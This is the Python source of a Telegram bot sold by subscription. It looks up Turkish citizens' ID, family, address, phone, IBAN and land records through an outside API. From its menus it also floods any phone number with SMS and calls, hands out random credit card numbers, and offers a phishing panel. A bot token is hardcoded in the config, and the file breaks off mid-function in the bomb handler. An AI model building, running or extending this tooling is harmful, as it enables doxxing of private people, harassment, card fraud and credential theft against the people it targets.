
"""
LUNA VİP SORGU BOT v2.0 - Full Fixed Version
Author: luna issiz popkekci
"""

import os
import sys
import json
import sqlite3
import random
import string
import requests
import re
import time
import threading
import datetime
import logging
import hashlib
import urllib.parse
import secrets
from io import BytesIO
from flask import Flask, request, jsonify, render_template_string

try:
    from telegram import (
        Update, InlineKeyboardButton, InlineKeyboardMarkup,
        ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
        ChatMember, Chat, BotCommand, BotCommandScopeDefault
    )
    from telegram.ext import (
        Application, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes, ConversationHandler
    )
    from telegram.constants import ParseMode, ChatType
except ImportError:
    print("[!] python-telegram-bot not installed. Run: pip install python-telegram-bot")
    sys.exit(1)

# =================== CONFIG ===================
BOT_TOKEN = "8767137480:AAFi7jUYQ4Byvn9o0jBOyUTlNYqncwIz1rs"
ADMIN_IDS = [7250471858]
OWNER_ID = 7250471858
SUPPORT_CHAT_ID = -1003827548507

API_BASE = "https://apiservices.alwaysdata.net/apiservices"
BOMB_API_BASE = "https://vexsorgu-api.alwaysdata.net"

BOT_NAME = "LUNA VİP SORGU "
BOT_USERNAME = "lunavipsorgupanel_bot"
DB_FILE = "luna_bot.db"
CODE_PREFIX = "LUNA-"
CODE_LENGTH = 7
MAX_CC_LIMIT = 40

PLANS = {
    "1ay": {"name": "1 Aylık", "price": 100, "days": 30},
    "3ay": {"name": "3 Aylık", "price": 250, "days": 90},
    "6ay": {"name": "6 Aylık", "price": 400, "days": 180},
    "1yil": {"name": "1 Yıllık", "price": 700, "days": 365},
    "vip": {"name": "VİP Süresiz", "price": 2000, "days": 9999},
}

API_ENDPOINTS = {
    1:  {"name": "💳 TC Sorgu", "path": "tc.php?tc={tc}", "desc": "TC kimlik numarası ile temel bilgileri sorgular."},
    2:  {"name": "💳 TC Pro Sorgu", "path": "tcpro.php?tc={tc}", "desc": "TC ile adres, GSM, medeni hal gibi detaylı bilgiler."},
    3:  {"name": "👤 Ad Soyad Sorgu", "path": "adsoyad.php?ad={ad}&soyad={soyad}", "desc": "Ad ve soyad ile TC + kimlik bilgisi sorgusu."},
    4:  {"name": "👤 Ad Soyad Pro", "path": "adsoyadpro.php?ad={ad}&soyad={soyad}&il={il}", "desc": "Ad soyad ile GSM ve detaylı bilgiler."},
    5:  {"name": "👨‍👩‍👧‍👦 Aile Sorgu", "path": "aile.php?tc={tc}", "desc": "TC ile 7 üyeye kadar aile kaydı sorgusu."},
    6:  {"name": "👨‍👩‍👧‍👦 Aile Pro", "path": "ailepro.php?tc={tc}", "desc": "TC ile GSM dahil aile sorgusu."},
    7:  {"name": "📍 Adres Sorgu", "path": "adres.php?tc={tc}", "desc": "TC ile ikametgah adresi sorgusu."},
    8:  {"name": "📍 Adres Pro", "path": "adrespro.php?tc={tc}", "desc": "TC ile detaylı ikametgah sorgusu."},
    9:  {"name": "🏦 İban Sorgu", "path": "iban.php?iban={iban}", "desc": "IBAN ile banka adı, şube, hesap no sorgusu."},
    10: {"name": "📱 GSM TC Sorgu", "path": "tcgsm.php?tc={tc}", "desc": "TC ile GSM numaraları listesi."},
    11: {"name": "📱 TC GSM Sorgu", "path": "gsmtc.php?gsm={gsm}", "desc": "GSM ile TC kimlik bilgisi sorgusu."},
    12: {"name": "👥 Kardeş Sorgu", "path": "kardes.php?tc={tc}", "desc": "TC ile kardeş listesi sorgusu."},
    13: {"name": "🏢 İş Yeri Sorgu", "path": "isyeri.php?tc={tc}", "desc": "TC ile iş yeri / SSK bilgileri."},
    14: {"name": "📋 Tapu Sorgu", "path": "tapu.php?tc={tc}", "desc": "TC ile tapu kayıtları sorgusu."},
    15: {"name": "🌳 Soy Ağacı", "path": "soyagaci.php?tc={tc}", "desc": "TC ile soy ağacı sorgusu."},
    16: {"name": "👶 Çocuk Sorgu", "path": "cocuk.php?tc={tc}", "desc": "TC ile çocuk listesi sorgusu."},
    17: {"name": "💑 Eş Sorgu", "path": "es.php?tc={tc}", "desc": "TC ile eş bilgisi sorgusu."},
    18: {"name": "👨‍👩‍👧‍👦 Sülale Sorgu", "path": "sulale.php?tc={tc}", "desc": "TC ile sülale kaydı sorgusu."},
    19: {"name": "📌 Ad İl İlçe", "path": "adililce.php?ad={ad}&il={il}&ilce={ilce}", "desc": "Ad, il ve ilçe ile detaylı sorgu."},
    20: {"name": "🏢 İş Yeri Ark", "path": "isyeriark.php?tc={tc}", "desc": "TC ile alternatif iş yeri sorgusu."},
    21: {"name": "📱 Güncel Operatör", "path": "gncloperator.php?numara={tel}", "desc": "Telefon numarası ile operatör sorgusu."},
}

# =================== DÜZELTİLMİŞ API'LER ===================
CALL_BOMB_API = "https://vexsorgu-api.alwaysdata.net/api/callbomb.php?phone=%2B90{phone}&how={amount}"
SMS_BOMB_API = "https://vexsorgu-api.alwaysdata.net/api/smbom.php?phone={phone}&how={amount}"
RANDOM_CC_API = "https://vexsorgu-api.alwaysdata.net/api/rancc.php?amount={amount}"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

stats = {
    "total_users": 0,
    "total_queries": 0,
    "total_bombs": 0,
    "total_premium": 0,
    "start_time": datetime.datetime.now()
}

# =================== DATABASE ===================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        is_premium INTEGER DEFAULT 0,
        premium_until TEXT,
        credits INTEGER DEFAULT 0,
        banned INTEGER DEFAULT 0,
        is_admin INTEGER DEFAULT 0,
        join_date TEXT,
        last_activity TEXT,
        total_queries INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS premium_codes (
        code TEXT PRIMARY KEY,
        plan_type TEXT,
        days INTEGER,
        created_by INTEGER,
        created_at TEXT,
        used_by INTEGER DEFAULT NULL,
        used_at TEXT DEFAULT NULL,
        is_used INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS query_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        api_number INTEGER,
        query_text TEXT,
        timestamp TEXT,
        success INTEGER DEFAULT 1
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        phone TEXT,
        bomb_type TEXT,
        amount INTEGER DEFAULT 1,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS group_premium (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        group_id INTEGER,
        code TEXT,
        days INTEGER,
        max_claims INTEGER DEFAULT 1,
        created_by INTEGER,
        created_at TEXT,
        claimed_by TEXT DEFAULT '',
        claimed_count INTEGER DEFAULT 0,
        is_active INTEGER DEFAULT 1,
        message_id INTEGER DEFAULT NULL
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS announcements (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        text TEXT,
        created_by INTEGER,
        created_at TEXT,
        target TEXT DEFAULT 'all'
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS cc_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        count INTEGER,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS phish_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        token TEXT,
        target_id TEXT,
        data TEXT,
        created_at TEXT
    )''')
    
    conn.commit()
    
    # Adminleri kaydet
    for admin_id in ADMIN_IDS:
        c.execute("""
            INSERT OR REPLACE INTO users 
            (user_id, username, first_name, last_name, is_admin, is_premium, premium_until, banned, join_date) 
            VALUES (?, 'Admin', 'Yönetici', 'LUNA', 1, 1, '2099-12-31 23:59:59', 0, datetime('now'))
        """, (admin_id,))
    
    conn.commit()
    conn.close()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    conn.close()

def db_fetch(query, params=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(query, params)
    if one:
        result = c.fetchone()
    else:
        result = c.fetchall()
    conn.close()
    return result

# =================== USER ===================
def user_exists(user_id):
    return db_fetch("SELECT 1 FROM users WHERE user_id = ?", (user_id,), one=True) is not None

def create_user(user_id, username, first_name, last_name):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db_exec(
        "INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, join_date, last_activity) VALUES (?, ?, ?, ?, ?, ?)",
        (user_id, username or "None", first_name or "None", last_name or "None", now, now)
    )

def update_activity(user_id):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db_exec("UPDATE users SET last_activity = ? WHERE user_id = ?", (now, user_id))

def get_user(user_id):
    return db_fetch("SELECT * FROM users WHERE user_id = ?", (user_id,), one=True)

def is_banned(user_id):
    u = get_user(user_id)
    return u and u[7] == 1

def is_premium(user_id):
    u = get_user(user_id)
    if not u:
        return False
    if u[4] == 1 and u[5]:
        try:
            premium_until = datetime.datetime.strptime(u[5], "%Y-%m-%d %H:%M:%S")
            if premium_until > datetime.datetime.now():
                return True
            else:
                db_exec("UPDATE users SET is_premium = 0 WHERE user_id = ?", (user_id,))
                return False
        except:
            return False
    return False

def is_admin_user(user_id):
    return user_id in ADMIN_IDS or (get_user(user_id) and get_user(user_id)[8] == 1)

def is_owner(user_id):
    return user_id == OWNER_ID

def get_user_credits(user_id):
    u = get_user(user_id)
    return u[6] if u else 0

def deduct_credit(user_id, amount=1):
    u = get_user(user_id)
    if u and u[6] >= amount:
        db_exec("UPDATE users SET credits = credits - ? WHERE user_id = ?", (amount, user_id))
        return True
    return False

def add_credits(user_id, amount):
    db_exec("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))

# =================== PREMIUM ===================
def generate_premium_code(plan_type, days, admin_id):
    code_suffix = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(CODE_LENGTH))
    code = f"{CODE_PREFIX}{code_suffix}"
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db_exec(
        "INSERT INTO premium_codes (code, plan_type, days, created_by, created_at) VALUES (?, ?, ?, ?, ?)",
        (code, plan_type, days, admin_id, now)
    )
    return code

def redeem_premium_code(user_id, code):
    c = db_fetch("SELECT * FROM premium_codes WHERE code = ?", (code,), one=True)
    if not c:
        return False, "❌ Kod bulunamadı!"
    if c[5] == 1:
        return False, "❌ Bu kod daha önce kullanılmış!"
    
    days = c[3]
    now = datetime.datetime.now()
    
    u = get_user(user_id)
    if u and u[4] == 1 and u[5]:
        try:
            existing = datetime.datetime.strptime(u[5], "%Y-%m-%d %H:%M:%S")
            if existing > now:
                new_until = existing + datetime.timedelta(days=days)
            else:
                new_until = now + datetime.timedelta(days=days)
        except:
            new_until = now + datetime.timedelta(days=days)
    else:
        new_until = now + datetime.timedelta(days=days)
    
    used_at = now.strftime("%Y-%m-%d %H:%M:%S")
    db_exec("UPDATE premium_codes SET is_used = 1, used_by = ?, used_at = ? WHERE code = ?",
            (user_id, used_at, code))
    db_exec("UPDATE users SET is_premium = 1, premium_until = ? WHERE user_id = ?",
            (new_until.strftime("%Y-%m-%d %H:%M:%S"), user_id))
    
    return True, f"✅ Premium başarıyla aktifleştirildi!\n⏰ Bitiş: {new_until.strftime('%d/%m/%Y %H:%M')}"

# =================== API FUNCTIONS ===================
def call_api(endpoint_num, params):
    if endpoint_num not in API_ENDPOINTS:
        return {"success": False, "error": "Geçersiz API endpoint"}
    
    ep = API_ENDPOINTS[endpoint_num]
    url_template = ep["path"]
    
    try:
        url = f"{API_BASE}/{url_template.format(**params)}"
    except KeyError as e:
        return {"success": False, "error": f"Eksik parametre: {e}"}
    
    try:
        resp = requests.get(url, timeout=30)
        content_type = resp.headers.get("Content-Type", "")
        
        if "application/json" in content_type or resp.text.strip().startswith("{"):
            data = resp.json()
            return data
        elif resp.status_code == 200:
            return {"success": True, "data": resp.text}
        else:
            return {"success": False, "error": f"HTTP {resp.status_code}: {resp.text[:200]}"}
    except requests.exceptions.Timeout:
        return {"success": False, "error": "⏱ API zaman aşımı (30sn)"}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": "🔌 API bağlantı hatası"}
    except json.JSONDecodeError:
        return {"success": True, "raw": resp.text[:1000]}
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}

def format_api_response(endpoint_num, result):
    ep = API_ENDPOINTS[endpoint_num]
    name = ep["name"]
    
    if not result.get("success") and result.get("error"):
        return f"❌ *{name} - Hata*\n\n{result['error']}"
    
    lines = [f"📁 *{name}*", f"━" * 25]
    
    if "results" in result:
        results = result["results"]
        if isinstance(results, list):
            for i, item in enumerate(results, 1):
                if isinstance(item, dict):
                    lines.append(f"\n── Kayıt {i} ──")
                    for key, val in item.items():
                        lines.append(f"• *{key}:* `{val}`")
                else:
                    lines.append(f"\n{i}. {item}")
        elif isinstance(results, dict):
            for key, val in results.items():
                lines.append(f"• *{key}:* `{val}`")
    
    if isinstance(result, dict):
        for key, val in result.items():
            if key in ["success", "results"] or key.startswith("_"):
                continue
            if isinstance(val, (str, int, float)):
                lines.append(f"• *{key}:* `{val}`")
            elif isinstance(val, list) and len(val) < 20:
                lines.append(f"• *{key}:* `{', '.join(str(v) for v in val[:5])}`")
    
    if "raw" in result:
        lines.append(f"\n📄 Ham Veri:\n`{result['raw'][:500]}`")
    
    if "data" in result and not lines[1:]:
        lines.append(f"\n📄 Veri:\n`{result['data'][:500]}`")
    
    return "\n".join(lines) if len(lines) > 1 else f"❌ Sonuç bulunamadı veya boş döndü."

# =================== START ===================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    
    create_user(user.id, user.username, user.first_name, user.last_name)
    update_activity(user.id)
    
    if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        await handle_group_start(update, context)
        return
    
    premium_status = "👑 PREMİUM" if is_premium(user.id) else "🔰 ÜCRETSİZ"
    credits = get_user_credits(user.id)
    
    welcome_text = f"""
╔══════════════════════╗
║   🌙 {BOT_NAME} 🌙
╚══════════════════════╝

👋 Merhaba {user.first_name}!

╔═══ 📊 DURUMUN ═══╗
👤 Durum: {premium_status}
⭐ Kredi: {credits}
📅 Katılım: {db_fetch("SELECT join_date FROM users WHERE user_id = ?", (user.id,), one=True)[0]}
╚════════════════════╝

📌 *Ana Menüye hoşgeldin!*
Aşağıdaki butonları kullanarak işlem yapabilirsin.
"""
    
    keyboard = [
        [InlineKeyboardButton("🔍 SORGU", callback_data="menu_sorgu"),
         InlineKeyboardButton("💣 BOMB", callback_data="menu_bomb")],
        [InlineKeyboardButton("👑 PREMİUM", callback_data="menu_premium"),
         InlineKeyboardButton("💳 RANDOM CC", callback_data="menu_cc")],
        [InlineKeyboardButton("🎣 PHISHING", callback_data="menu_phishing"),
         InlineKeyboardButton("👤 PROFİL", callback_data="menu_profil")],
        [InlineKeyboardButton("👑 Sahip", callback_data="contact_owner"),
         InlineKeyboardButton("💬 Destek", url="https://t.me/lunasloury")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_group_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    
    text = update.message.text.lower() if update.message else ""
    
    if any(phrase in text for phrase in ["girdin mi", "girdinmi", "bu sohbete girdin"]):
        await update.message.reply_text(
            "✅ Evet, bu sohbete girdin! Premium dağıtımları için hazır.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if update.message.text and not update.message.text.startswith("/"):
        await update.message.reply_text(
            f"Merhaba {user.first_name}! Bu grupta premium dağıtımları yapılıyor.\n"
            f"Komut listesi için /yardim yazabilirsin.",
            parse_mode=ParseMode.MARKDOWN
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📚 *LUNA VİP SORGU BOT - Komutlar*\n\n"
        "/start - Ana menüyü aç\n"
        "/yardim - Bu menüyü göster\n"
        "/sorgu - Sorgu menüsü\n"
        "/bomb - Bombardıman menüsü\n"
        "/premium - Premium bilgileri\n"
        "/profil - Profil bilgileri\n"
        "/cc - Random CC al\n"
        "/phish - Phishing paneli",
        parse_mode=ParseMode.MARKDOWN
    )

# =================== CALLBACK ===================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    data = query.data
    
    await query.answer()
    
    create_user(user.id, user.username, user.first_name, user.last_name)
    update_activity(user.id)
    
    if is_banned(user.id) and not is_admin_user(user.id):
        await query.edit_message_text("🚫 Hesabınız banlanmıştır.\nİtiraz için: @lunasloury")
        return
    
    handlers = {
        "main_menu": lambda: show_main_menu(query, user),
        "menu_sorgu": lambda: show_sorgu_menu(query),
        "menu_bomb": lambda: show_bomb_menu(query),
        "menu_premium": lambda: show_premium_menu(query, user),
        "menu_cc": lambda: show_cc_menu(query, user),
        "menu_phishing": lambda: show_phishing_menu(query, user),
        "menu_profil": lambda: show_profile(query, user),
        "contact_owner": lambda: show_contact_owner(query),
        "redeem_code": lambda: start_redeem(query, user, context),
        "bomb_sms": lambda: start_bomb(query, user, context, "sms"),
        "bomb_call": lambda: start_bomb(query, user, context, "call"),
        "cc_get": lambda: handle_cc_get(query, user, context),
        "phish_method1": lambda: start_phish_method1(query, user, context),
        "phish_method2": lambda: start_phish_method2(query, user, context),
        "phish_logs": lambda: show_phish_logs(query, user),
    }
    
    if data in handlers:
        await handlers[data]()
        return
    
    if data.startswith("api_"):
        await handle_api_selection(query, user, context)
    elif data.startswith("phish_token_"):
        await handle_phish_token(query, user, context)

async def show_main_menu(query, user):
    premium_status = "👑 PREMİUM" if is_premium(user.id) else "🔰 ÜCRETSİZ"
    credits = get_user_credits(user.id)
    
    text = f"""
╔══════════════════════╗
║   🌙 {BOT_NAME} 🌙
╚══════════════════════╝

👋 Hoşgeldin {user.first_name}!

╔═══ 📊 DURUMUN ═══╗
👤 Durum: {premium_status}
⭐ Kredi: {credits}
╚════════════════════╝
"""
    
    keyboard = [
        [InlineKeyboardButton("🔍 SORGU", callback_data="menu_sorgu"),
         InlineKeyboardButton("💣 BOMB", callback_data="menu_bomb")],
        [InlineKeyboardButton("👑 PREMİUM", callback_data="menu_premium"),
         InlineKeyboardButton("💳 RANDOM CC", callback_data="menu_cc")],
        [InlineKeyboardButton("🎣 PHISHING", callback_data="menu_phishing"),
         InlineKeyboardButton("👤 PROFİL", callback_data="menu_profil")],
        [InlineKeyboardButton("👑 Sahip", callback_data="contact_owner"),
         InlineKeyboardButton("💬 Destek", url="https://t.me/lunasloury")],
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def show_contact_owner(query):
    await query.edit_message_text(
        "👑 *Sahip ile İletişim*\n\n"
        "👤 Sahip: [@lunasloury](tg://user?id=7250471858)\n"
        "💬 Destek: @lunasloury\n\n"
        "Tüm sorunlarınız için destek grubuna yazabilirsiniz.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Geri", callback_data="main_menu")]
        ])
    )

# =================== SORGU ===================
async def show_sorgu_menu(query):
    text = "🔍 *SORGU MENÜSÜ*\n\nHangi sorguyu yapmak istersin?\n"
    
    keyboard = [
        [InlineKeyboardButton("💳 TC Sorgu", callback_data="api_1"),
         InlineKeyboardButton("💳 TC Pro", callback_data="api_2")],
        [InlineKeyboardButton("👤 Ad Soyad", callback_data="api_3"),
         InlineKeyboardButton("👤 Ad Soyad Pro", callback_data="api_4")],
        [InlineKeyboardButton("👨‍👩‍👧‍👦 Aile", callback_data="api_5"),
         InlineKeyboardButton("👨‍👩‍👧‍👦 Aile Pro", callback_data="api_6")],
        [InlineKeyboardButton("📍 Adres", callback_data="api_7"),
         InlineKeyboardButton("📍 Adres Pro", callback_data="api_8")],
        [InlineKeyboardButton("🏦 İban", callback_data="api_9"),
         InlineKeyboardButton("📱 TC→GSM", callback_data="api_10")],
        [InlineKeyboardButton("📱 GSM→TC", callback_data="api_11"),
         InlineKeyboardButton("👥 Kardeş", callback_data="api_12")],
        [InlineKeyboardButton("🏢 İş Yeri", callback_data="api_13"),
         InlineKeyboardButton("📋 Tapu", callback_data="api_14")],
        [InlineKeyboardButton("🌳 Soy Ağacı", callback_data="api_15"),
         InlineKeyboardButton("👶 Çocuk", callback_data="api_16")],
        [InlineKeyboardButton("💑 Eş", callback_data="api_17"),
         InlineKeyboardButton("👨‍👩‍👧‍👦 Sülale", callback_data="api_18")],
        [InlineKeyboardButton("📌 Ad-İl-İlçe", callback_data="api_19"),
         InlineKeyboardButton("🏢 İş Yeri Ark", callback_data="api_20")],
        [InlineKeyboardButton("📱 Güncel Operatör", callback_data="api_21")],
        [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")],
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def handle_api_selection(query, user, context):
    api_num = int(query.data.split("_")[1])
    ep = API_ENDPOINTS[api_num]
    
    if not is_premium(user.id) and get_user_credits(user.id) < 1:
        await query.edit_message_text(
            "❌ *Yetersiz Kredi!*\n\n"
            "Sorgu yapmak için premium üyelik veya en az 1 kredi gerekli.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👑 Premium Al", callback_data="menu_premium")],
                [InlineKeyboardButton("🔙 Geri", callback_data="menu_sorgu")]
            ])
        )
        return
    
    path = ep["path"]
    params_needed = re.findall(r'\{(\w+)\}', path)
    
    context.user_data["selected_api"] = api_num
    context.user_data["params_needed"] = params_needed
    context.user_data["param_index"] = 0
    context.user_data["param_values"] = {}
    
    if not params_needed:
        result = call_api(api_num, {})
        await query.edit_message_text(
            format_api_response(api_num, result),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Sorgu Menüsü", callback_data="menu_sorgu"),
                 InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
            ])
        )
        db_exec("INSERT INTO query_logs (user_id, api_number, query_text, timestamp) VALUES (?, ?, ?, ?)",
                (user.id, api_num, "no_params", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        if not is_premium(user.id):
            deduct_credit(user.id)
        return
    
    param_name = params_needed[0]
    param_display = {
        "tc": "TC Kimlik Numarası (11 hane)",
        "ad": "Ad (ör: mehmet)",
        "soyad": "Soyad (ör: yılmaz)",
        "il": "İl (ör: istanbul)",
        "ilce": "İlçe (ör: kadıköy)",
        "gsm": "GSM Numarası (ör: 5415722525)",
        "tel": "Telefon Numarası (ör: 5315312472)",
        "iban": "IBAN (ör: TR280000000000000000000000)",
        "numara": "Telefon Numarası (başında 0 olmadan)"
    }
    
    await query.edit_message_text(
        f"📁 *{ep['name']}*\n\n📝 *{ep['desc']}*\n\n⚙️ Lütfen aşağıdaki parametreyi girin:\n\n📌 *{param_display.get(param_name, param_name)}*\n\n💡 *Kullanım:* Parametreyi direkt mesaj olarak yazın.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ İptal", callback_data="menu_sorgu")]
        ])
    )
    
    context.user_data["awaiting_param"] = True

async def handle_param_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    
    if not context.user_data.get("awaiting_param") or "selected_api" not in context.user_data:
        return
    
    api_num = context.user_data["selected_api"]
    params_needed = context.user_data["params_needed"]
    param_index = context.user_data.get("param_index", 0)
    param_values = context.user_data.get("param_values", {})
    
    if param_index >= len(params_needed):
        context.user_data["awaiting_param"] = False
        return
    
    param_name = params_needed[param_index]
    param_values[param_name] = text
    context.user_data["param_values"] = param_values
    context.user_data["param_index"] = param_index + 1
    
    if param_index + 1 < len(params_needed):
        next_param = params_needed[param_index + 1]
        param_display = {
            "tc": "TC Kimlik Numarası (11 hane)",
            "ad": "Ad", "soyad": "Soyad", "il": "İl", "ilce": "İlçe",
            "gsm": "GSM Numarası", "tel": "Telefon Numarası",
            "iban": "IBAN", "numara": "Telefon Numarası"
        }
        await update.message.reply_text(
            f"✅ `{param_name}` kaydedildi: `{text}`\n\n📌 Şimdi *{param_display.get(next_param, next_param)}* girin:",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        context.user_data["awaiting_param"] = False
        result = call_api(api_num, param_values)
        
        if not is_premium(user.id):
            deduct_credit(user.id)
        
        db_exec("INSERT INTO query_logs (user_id, api_number, query_text, timestamp) VALUES (?, ?, ?, ?)",
                (user.id, api_num, str(param_values), datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        await update.message.reply_text(
            format_api_response(api_num, result),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔍 Yeni Sorgu", callback_data="menu_sorgu"),
                 InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu")]
            ])
        )
        
        del context.user_data["awaiting_param"]
        del context.user_data["selected_api"]

# =================== BOMB (DÜZELTİLMİŞ) ===================
async def show_bomb_menu(query):
    text = """
💣 *BOMBARDIMAN MENÜSÜ*

📌 *Kullanım:*
• SMS Bomb: Telefona SMS gönderir
• Call Bomb: Telefonu arar

⚠️ *Sadece premium kullanıcılar için!*

📝 *Format:* 
Önce numara, sonra miktar girin
Örnek: `5374098765` ve `5`
"""
    keyboard = [
        [InlineKeyboardButton("💬 SMS Bomb", callback_data="bomb_sms"),
         InlineKeyboardButton("📞 Call Bomb", callback_data="bomb_call")],
        [InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def start_bomb(query, user, context, bomb_type):
    if not is_premium(user.id):
        await query.edit_message_text(
            "❌ *Sadece Premium Kullanıcılar!*\n\nBombardıman sadece premium üyeler içindir.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👑 Premium Al", callback_data="menu_premium")],
                [InlineKeyboardButton("🔙 Geri", callback_data="menu_bomb")]
            ])
        )
        return
    
    context.user_data["bomb_type"] = bomb_type
    context.user_data["awaiting_bomb_phone"] = True
    
    type_name = "SMS" if bomb_type == "sms" else "Call"
    
    await query.edit_message_text(
        f"💣 *{type_name} Bomb*\n\n"
        f"1️⃣ Önce *telefon numarasını* girin (başında 0 veya +90 olmadan):\n"
        f"📌 Örnek: `5374098765`\n\n"
        f"⚠️ *Uyarı:* Apimiz çok güçlüdür tam isteğe göre arama yapar!",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ İptal", callback_data="menu_bomb")]
        ])
    )

async def handle_bomb_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    
    if not context.user_data.get("awaiting_bomb_phone"):
        return
    
    bomb_type = context.user_data.get("bomb_type")
    if not bomb_type:
        return
    
    # Telefon numarasını temizle
    phone = re.sub(r'[^0-9]', '', text)
    if len(phone) < 10 or len(phone) > 13:
        await update.message.reply_text(
            "❌ *Geçersiz numara!*\n\nLütfen 10-13 haneli bir numara girin.\nÖrnek: `5374098765`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    context.user_data["bomb_phone"] = phone
    context.user_data["awaiting_bomb_phone"] = False
    context.user_data["awaiting_bomb_amount"] = True
    
    await update.message.reply_text(
        f"✅ Numara kaydedildi: `{phone}`\n\n"
        f"2️⃣ Şimdi *miktarı* girin (kaç kez gönderilecek):\n"
        f"📌 Örnek: `5`\n"
        f"⚠️ Maksimum: `50`",
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_bomb_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    
    if not context.user_data.get("awaiting_bomb_amount"):
        return
    
    try:
        amount = int(text)
        if amount < 1 or amount > 50:
            raise ValueError
    except:
        await update.message.reply_text(
            "❌ *Geçersiz miktar!*\n\n1-50 arası bir sayı girin.\nÖrnek: `5`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    phone = context.user_data["bomb_phone"]
    bomb_type = context.user_data["bomb_type"]
    context.user_data["awaiting_bomb_amount"] = False
    
    await update.message.reply_text(f"⏳ {bomb_type.upper()} Bomb gönderiliyor... ({amount} kez)")
    
    # DÜZELTİLMİŞ API'LER
    if bomb_type == "sms":
        # SMS: phone=5XXXXXXXXX
        url = SMS_BOMB_API.format(phone=phone, amount=amount)
    else:
        # Call: phone=%2B90XXXXXXXXXX
        url = CALL_BOMB_API.format(phone=phone, amount=amount)
    
    try:
        resp = requests.get(url, timeout=60)
        result_text = resp.text[:500] if resp.status_code == 200 else f"Hata: {resp.status_code}"
    except Exception as e:
        result_text = f"Bağlantı hatası: {str(e)[:100]}"
    
    db_exec("INSERT INTO bomb_logs (user_id, phone, bomb_type, amount, timestamp) VALUES (?, ?, ?, ?, ?)",
            (user.id, phone, bomb_type, amount, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    
    await update.message.reply_text(
